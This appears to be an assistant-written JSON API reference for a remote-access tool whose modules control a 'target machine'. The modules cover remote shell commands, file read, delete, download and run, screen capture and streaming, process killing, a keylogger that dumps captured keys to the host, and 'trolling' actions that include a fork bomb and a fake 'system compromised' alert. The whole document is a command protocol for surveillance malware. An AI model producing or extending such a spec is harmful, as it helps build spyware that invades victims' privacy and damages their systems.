### JSON API Schema

Here is the complete schema based on your code and the features listed in your `README.md`.

**General Structure:**

```json
{
  "module": "MODULE_NAME",
  "args": {
    /* Arguments specific to the module */
  }
}
```

---

#### 1. Remote Shell (`"RSH"`)

Used to execute commands on the target machine.

| `args` Key | Type   | Required? | Description                                                              |
| :--------- | :----- | :-------- | :----------------------------------------------------------------------- |
| `command`  | String | Yes       | The command to be executed.                                              |
| `shell`    | String | No        | The shell to use. Can be `"cmd"` or `"powershell"`. Defaults to `"cmd"`. |

**Example:**

```json
{
  "module": "RSH",
  "args": {
    "command": "Get-NetIPAddress -AddressFamily IPv4",
    "shell": "powershell"
  }
}
```

---

#### 2. File System (`"FS"`)

Used for all file and directory manipulations.

| `args` Key  | Type   | Required?    | Description                                                                             |
| :---------- | :----- | :----------- | :-------------------------------------------------------------------------------------- |
| `operation` | String | Yes          | The action to perform: `"list"`, `"read"`, `"delete"`, `"move"`, `"download"`, `"run"`. |
| `path`      | String | Yes          | The primary path for the operation.                                                     |
| `to`        | String | For `"move"` | The destination path for a move/rename operation.                                       |

**Example (List directory):**

```json
{
  "module": "FS",
  "args": {
    "operation": "list",
    "path": "C:\\Users\\Public\\Documents"
  }
}
```

**Example (Move file):**

```json
{
  "module": "FS",
  "args": {
    "operation": "move",
    "path": "C:\\temp\\report.docx",
    "to": "C:\\archives\\report_old.docx"
  }
}
```

---

#### 3. Remote Screen (`"RS"`)

Used for screen capture and streaming.

| `args` Key | Type   | Required?            | Description                                                                                     |
| :--------- | :----- | :------------------- | :---------------------------------------------------------------------------------------------- |
| `action`   | String | Yes                  | `"screenshot"` for a single frame, `"stream_start"` to begin streaming, `"stream_stop"` to end. |
| `fps`      | Number | For `"stream_start"` | Frames per second for the stream.                                                               |

**Example (Single screenshot):**

```json
{
  "module": "RS",
  "args": {
    "action": "screenshot"
  }
}
```

**Example (Start streaming):**

```json
{
  "module": "RS",
  "args": {
    "action": "stream_start",
    "fps": 15
  }
}
```

---

#### 4. Task Manager (`"TM"`)

Used for managing processes.

| `args` Key | Type   | Required?    | Description                                                     |
| :--------- | :----- | :----------- | :-------------------------------------------------------------- |
| `action`   | String | Yes          | `"list"` to get all processes, `"kill"` to terminate a process. |
| `pid`      | Number | For `"kill"` | The Process ID (PID) to terminate.                              |

**Example (List processes):**

```json
{
  "module": "TM",
  "args": {
    "action": "list"
  }
}
```

**Example (Kill a process):**

```json
{
  "module": "TM",
  "args": {
    "action": "kill",
    "pid": 4096
  }
}
```

---

#### 5. Trolling (`"TR"`)

Used for various "fun" actions on the target.

| `args` Key | Type   | Required?                              | Description                                                            |
| :--------- | :----- | :------------------------------------- | :--------------------------------------------------------------------- |
| `action`   | String | Yes                                    | `"message_box"`, `"open_link"`, `"set_clipboard"`, `"fork_bomb"`, etc. |
| `title`    | String | For `"message_box"`                    | The title of the message box window.                                   |
| `text`     | String | For `"message_box"`, `"set_clipboard"` | The content for the message or clipboard.                              |
| `url`      | String | For `"open_link"`                      | The URL to open in the default browser.                                |

**Example (Show message box):**

```json
{
  "module": "TR",
  "args": {
    "action": "message_box",
    "title": "System Security Alert",
    "text": "Your system has been compromised."
  }
}
```

---

#### 6. Keylogger (`"KL"`)

Controls the keylogging functionality.

| `args` Key | Type   | Required? | Description                                                           |
| :--------- | :----- | :-------- | :-------------------------------------------------------------------- |
| `action`   | String | Yes       | `"start"`, `"stop"`, or `"dump"` (to send captured keys to the host). |

**Example (Get all logged keys):**

```json
{
  "module": "KL",
  "args": {
    "action": "dump"
  }
}
```

---

#### 7. Chat (`"CH"`)

Manages the chat functionality.

| `args` Key | Type   | Required?    | Description                                           |
| :--------- | :----- | :----------- | :---------------------------------------------------- |
| `action`   | String | Yes          | `"start"`, `"send"`, `"stop"`.                        |
| `message`  | String | For `"send"` | The message text to send to the target's chat window. |

**Example (Send a message):**

```json
{
  "module": "CH",
  "args": {
    "action": "send",
    "message": "Can you hear me?"
  }
}
```
